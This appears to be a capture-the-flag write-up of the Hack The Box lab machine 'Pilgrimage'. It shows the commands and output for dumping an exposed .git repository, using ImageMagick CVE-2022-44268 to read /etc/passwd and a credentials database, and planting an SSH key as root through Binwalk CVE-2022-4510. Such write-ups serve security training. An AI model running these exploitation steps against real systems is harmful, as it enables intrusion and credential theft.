---
layout: post
title: HTB - Pilgrimage
date: 2023-11-25 12:48 +0200
categories: [HTB Machines]
tags: [Binwalk,Magick,.git,LFI,gitdumper,sqlite,Cve-2022-44268,Cve-2022-4510]  
image: /assets/img/hackthebox/machines writeups/Pilgrimage/Cover.png
---


## Summary

Pilgrimage starts with a website that hosted using Nginx which aimed to help users to `SHRINK` their images size. Enumerating helps to found `/.git` dir which contains the website's source php codes and a `Magick` binary which shows that the website is using `ImageMagick 7.1.0–49` which is vulnerable to `LFI`, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the root user is running bash script called `malwarescan.sh` after check the script found that it is using `Binwalk v2.3.2` which has a vulnerability that leads to `RCE`. We will leverage this vulnerability to escalate our access privileges to root.

## Machine Info

|                      |                                                                                                  |
|:--------------------:|:------------------------------------------------------------------------------------------------:|
| **Box Name**         |  Pilgrimage                                                                                        |
| **OS**               |  ![](/assets/img/hackthebox/machines writeups/Pilgrimage/linux_penguin.png){: w="35" h="30" }      |
| **Difficulty**       |  Easy                                                                                            |
| **Graph**            |  ![](/assets/img/hackthebox/machines writeups/Pilgrimage/graph.png)                                |
| **Points**           |  20                                                                                              |
| **Release Date**     |  24 Jun 2023                                                                                     |
| **Retire Date**      |  25 Nov 2023                                                                                     |




## Recon

### Nmap

Using `Nmap` to enumerate all open ports and services by doing this on two phases to speed things up :

- **Phase 1 :** Make a simple scan to check for all opened `TCP` ports with high rate of checking port equel to 10000.
- **Phase 2 :** After idetify the open ports start the sec phase to fingerprint (services, versions, etc) for each open port.


```bash
# Fast scan to check open ports
nmap -p- --min-rate 10000 10.10.11.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 06:30 EST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.16s latency).
Not shown: 64886 filtered tcp ports (no-response), 647 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 32.26 seconds


# Detailed Scan for spesfic open ports                                                                 
nmap -A -p 22,80 -sC 10.10.11.219
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-25 06:39 EST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```
{: .nolineno }

`nmap` finds the following TCP ports:
- **SSH** - 22 
- **HTTP** - 80 with `/.git` Git Repository Exposed



### HTTP Pilgrimage.htb - TCP 80

The home page of the website redirect to Pilgrimage.htb. so we have to add this hostname in `/etc/hosts`

![Home Page](/assets/img/hackthebox/machines writeups/Pilgrimage/redirect.png)

```console
(kali㉿kali)-[~]$ cat /etc/hosts                 
127.0.0.1       localhost 
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.10.11.219    pilgrimage.htb
```

Found that the website is taking an image and resize it to make it smaller then save it with random name under **shrunk** directory.


![](/assets/img/hackthebox/machines writeups/Pilgrimage/upload.png)

![](/assets/img/hackthebox/machines writeups/Pilgrimage/upload2.png)


#### Git Repository

After playing around with the website decided to trying to dump the `/.git` repo content using [git-dumper](https://github.com/arthaud/git-dumper).


```bash
python3.11 git_dumper.py http://pilgrimage.htb/.git/ git

[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
-- [snip] --

[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```
{: .nolineno }

This as we can see dump the content of the git repo to a directory called git

![](/assets/img/hackthebox/machines writeups/Pilgrimage/git.png)

#### Source Code Analysis

After go through the code found this spesfic php code in `index.php` page 

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
      unlink($upload->getFullPath());
      $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
      if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      header("Location: /?message=" . $upload_path . "&status=success");
    }
    else {
      header("Location: /?message=Image shrink failed&status=fail");
    }
  }
  else {
    header("Location: /?message=Image shrink failed&status=fail");
  }
}
```

The above code do the following : 
- **Line 1 - 7** : It takes the POST and creates a file object, saving it in /tmp:
- **Line 8 - 14**: Takes the result then generate new file name from uniqid (unique ID based on time in PHP):
- **Line 15**: Run the `magick` binary `/var/www/pilgrimage.htb/` path to convert the image by shrinking it by 50% and then deletes the original file:
- **Line 18 - 22** : Check If the user is logged in and if it does it saves the new path and original path to the DB which using SQLite db at this path `/var/db/pilgrimage`

#### Version Check

After trying to run the magick binary which dumped before using the git-dumper tool got the exact version of ImageMagick tool which is `7.1.0-49 beta`

```console
(kali㉿kali)-[~/Tools/git-dumper/git]$./magick -h
Error: Invalid argument or not enough arguments

Usage: magick tool [ {option} | {image} ... ] {output_image}
Usage: magick [ {option} | {image} ... ] {output_image}
       magick [ {option} | {image} ... ] -script {filename} [ {script_args} ...]
       magick -help | -version | -usage | -list {option}

                                                                                                                                                                 
(kali㉿kali)-[~/Tools/git-dumper/git]$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)                  
```

After some searching found that this version is vulnerable to `CVE-2022-44268` 

![](/assets/img/hackthebox/machines writeups/Pilgrimage/search-exploit.png)

## Shell as emily

#### Exploit CVE-2022-44268

Using this cool python [exploit](https://github.com/kljunowsky/CVE-2022-44268) .Using it first to create a malicious image, and then again pointing at the image on the site to get the results of the exploit

```console
(kali㉿kali)-[~/Tools/git-dumper/git]$  python3.11 CVE-2022-44268.py --image sample.png --file-to-read /etc/passwd --output malcious.png
(kali㉿kali)-[~/Tools/git-dumper/git]$  python3.11 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6563afaa3daee.png             

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
{: .nolineno }

#### Database SQLite

Using the same python exploit before to get the sqlite db 

```console
(kali㉿kali)-[~]$  python3.11 CVE-2022-44268.py --image sample.png --file-to-read /var/db/pilgrimage --output malcious.png
(kali㉿kali)-[~]$  python3.11 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/6563b08379ecc.png                      
Traceback (most recent call last):
  File "/home/kali/HTB/HTB Machines/Pilgrimage/CVE-2022-44268/CVE-2022-44268.py", line 49, in <module>
    main()
  File "/home/kali/HTB/HTB Machines/Pilgrimage/CVE-2022-44268/CVE-2022-44268.py", line 17, in main
    decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8')
                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x8f in position 27: invalid start byte
```

The previous error is appears because this is a SQLite file not normal ASCII text file so i downlaod the image manually and with a little of bash i can get the sqlite db file.

```console
(kali㉿kali)-[~]$ identify -verbose ~/Downloads/6563b08379ecc.png |grep -i 'Raw profile type' -A 1000 |tail -n +4|tr -d '\n' |grep -oE '[a-zA-Z0-9]{100,}'|xxd -r -p > db.sqlite

(kali㉿kali)-[~]$ sqlite3 db.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
images  users 
```
{: .nolineno }

Dumping content of users table which reveal the emily user password

```console
(kali㉿kali)-[~]$ sqlite3 db.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> select * from users;
emily|abigchonkyboi123
sqlite> 
```

Using SSH and the password from the SQLite db we can login as emily

```console
(kali㉿kali)-[~]$ sshpass -p abigchonkyboi123 ssh emily@pilgrimage.htb
Warning: Permanently added 'pilgrimage.htb' (ED25519) to the list of known hosts.
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

### Read User File

```console
emily@pilgrimage:~$ cat user.txt 
0dc08875e40e******************
```

## Shell as Root

### Enumeration

#### Sudoers

Check if emily user have permssions to run sudo 


```console
emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
```

#### Processes

Current processes shows that the root user is running bash script called `malwarescan.sh` at this path `/usr/sbin/malwarescan.sh`

```console
emily@pilgrimage:~$ ps aux

...[snip]...
message+     650  0.0  0.1   8260  4584 ?        Ss   Nov24   0:04 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         652  0.0  0.0   6816  3072 ?        Ss   Nov24   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         655  0.0  0.6 209752 27708 ?        Ss   Nov24   0:12 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         656  0.0  0.1 220796  6228 ?        Ssl  Nov24   0:01 /usr/sbin/rsyslogd -n -iNONE
root         660  0.0  0.0      0     0 ?        S    Nov24   0:00 [card0-crtc7]
root         664  0.0  0.0   2516   712 ?        S    Nov24   0:00 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
root         665  0.0  0.0   6816  2372 ?        S    Nov24   0:00 /bin/bash /usr/sbin/malwarescan.sh
root         669  0.0  0.1  13864  7044 ?        Ss   Nov24   0:02 /lib/systemd/systemd-logind
root         695  0.0  0.1  13352  7572 ?        Ss   Nov24   0:01 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         702  0.0  0.0   5844  1668 tty1     Ss+  Nov24   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         722  0.0  0.1  99884  5640 ?        Ssl  Nov24   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.
root         754  0.0  0.0  56376  1632 ?        Ss   Nov24   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data     760  0.1  0.1  57664  6884 ?        S    Nov24   4:06 nginx: worker process
www-data     761  0.1  0.1  57820  7040 ?        S    Nov24   5:04 nginx: worker process
root         801  0.0  0.0      0     0 ?        S    Nov24   0:00 [hwmon1]
www-data    1278  0.0  0.4 210132 18304 ?        S    Nov24   0:05 php-fpm: pool www
www-data    1279  0.0  0.4 210132 18100 ?        S    Nov24   0:05 php-fpm: pool www
www-data    1280  0.0  0.4 210132 18208 ?        S    Nov24   0:05 php-fpm: pool www
emily      54621  0.0  0.2  15180  8412 ?        Ss   Nov26   0:00 /lib/systemd/systemd --user
emily      54622  0.0  0.0 166828  2668 ?        S    Nov26   0:00 (sd-pam)
...[snip]...
```

#### malwarescan.sh

This is the `malwarescan.sh` script content

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

The script is just checking for any file creations in the shrunk directory and then using binwalk tool to look for any executables in the files.


### Privelege Esclation

#### CVE-2022-4510

Checking the binwalk tool installed version and found that the version is `v2.3.2`

```console
emily@pilgrimage:~$ binwalk -h
test20

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...
...[snip]...
```

Searching for exploit for this version and found that this version is having CVE `CVE-2022-4510`

![](/assets/img/hackthebox/machines writeups/Pilgrimage/binwalk-exploit.png)


#### Exploit

first i creating a pair of Private-Public keys 

```console
(kali㉿kali)-[~/HTB/HTB Machines/Pilgrimage]$ ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/HTB/HTB Machines/Pilgrimage/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/HTB/HTB Machines/Pilgrimage/id_rsa
Your public key has been saved in /home/kali/HTB/HTB Machines/Pilgrimage/id_rsa.pub
The key fingerprint is:
SHA256:v5BzAoKZs6TwyPr0rIvROQemcwPd95PCNIkTgcT499Q kali@kali
The key's randomart image is:
+---[RSA 3072]----+
| +...            |
|. o  .           |
| .  .  .         |
| ..=.o..E        |
|o X.=o* S        |
|oX = *.+ +       |
|*.X . o O o      |
|.* *   . * .     |
|o.+oo     .      |
+----[SHA256]-----+
```


Then using this [Exploit Repo](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) that abuses the plugin creation method. The output of the tool will be a  file named binwalk_exploit.png which has to be uploaded into the shrunk directory

```console
(kali㉿kali)-[~/HTB/HTB Machines/Pilgrimage/CVE-2022-4510-WalkingPath]$ python3.11 walkingpath.py ssh sample.png ../id_rsa.pub

(kali㉿kali)-[~/HTB/HTB Machines/Pilgrimage/CVE-2022-4510-WalkingPath]$ sshpass -p abigchonkyboi123 scp binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```


#### SSH 

Now using the private key we can ssh as root user

```console 
(kali㉿kali)-[~/HTB/HTB Machines/Pilgrimage/CVE-2022-4510-WalkingPath]$ ssh -i ../id_rsa root@pilgrimage.htb                                                                    
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```

Get the root.txt content

```console
root@pilgrimage$ cat root.txt
d3e8abcbae12********************
```
